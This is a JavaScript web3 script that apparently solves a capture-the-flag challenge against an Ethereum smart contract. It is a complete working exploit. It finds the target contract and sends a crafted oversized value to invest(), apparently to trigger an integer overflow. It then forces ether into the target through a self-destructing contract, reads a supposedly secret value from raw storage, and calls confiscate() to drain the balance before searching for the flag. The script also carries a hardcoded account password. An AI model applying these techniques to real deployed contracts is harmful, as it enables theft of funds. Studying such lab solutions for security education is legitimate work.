account = '0x72d45c0dc7EfdAfd00467086B65B2fe078788c44';
web3.personal.unlockAccount(account, '123qwe', 1500);

web3.eth.defaultAccount = account;

for (i = 0; i < web3.eth.getBlock('latest').number; ++i) {
	b = web3.eth.getBlock(i);
	if(b.transactions != '') {
		var target = web3.eth.getTransactionReceipt(b.transactions.toString()).contractAddress;
		console.log('Found contract: ', target);
		break;
	}
}



var victimContract = web3.eth.contract([{"constant":false,"inputs":[{"name":"a","type":"uint256"},{"name":"b","type":"bytes16"}],"name":"confiscate","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"a","type":"uint256"},{"name":"b","type":"uint256"}],"name":"invest","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]);

console.log('Start balance: ', web3.eth.getBalance(target));

victim = victimContract.at(target);

step1();

function step1() {
	victim.invest(
		1,
		'0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffe1ecc80',
		{value: 1, gas: '3000000'},
		function(e,v) {
			console.log(e,v);
			setTimeout(step2, 1000);
		}
	);
}

function step2() {
	victim.invest(
		2,
		0,
		{value: 2, gas: '3000000'},
		function(e,v) {
			console.log(e,v);
			setTimeout(step3, 1000);
		}
	);
}

function step3() {
	console.log('Interim balance: ', web3.eth.getBalance(target));

	var donorContract = web3.eth.contract([{"inputs":[{"name":"target","type":"address"}],"payable":true,"stateMutability":"payable","type":"constructor"}]);
	var donor = donorContract.new(
	   target,
	   {
	     from: account,
	     data: '0x6080604052604051602080603f833981018060405281019080805190602001909291905050508073ffffffffffffffffffffffffffffffffffffffff16ff00',
	     gas: '4700000',
	     value: 2
	   }, function (e, contract){
	        console.log('Donor contract mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash);
        	setTimeout(step4, 1000);
	    }
	);
}

function step4() {
	web3.eth.getStorageAt(target, 3, function(e,v){console.log('Got secret: ', '0x' + v.substring(34,66)); secret = '0x' + v.substring(34, 66);})

	victim.confiscate(2,
		secret,
		{gas: '3000000'},
		function(e,v) {
			console.log(e,v);
			setInterval(function() {
				if(web3.eth.getBalance(target) == 0) {
					console.log('Solved! Balance=0. Searching for flag...');
					for (i = web3.eth.getBlock('latest').number - 10; i < web3.eth.getBlock('latest').number; ++i) {
						b = web3.eth.getBlock(i);
						// dirty but working
						if(b.transactions.toString().length == 66 && web3.eth.getTransaction(b.transactions.toString()).to == '0x72d45c0dc7efdafd00467086b65b2fe078788c44') {
							var flag = web3.eth.getTransaction(b.transactions.toString()).input;
							console.log('Found flag: ', web3.toAscii(flag));
							break;
						}
					}
				} else {
					console.log('Not yet solved, waiting...')
				}
			}, 1000);
		}
	);
}
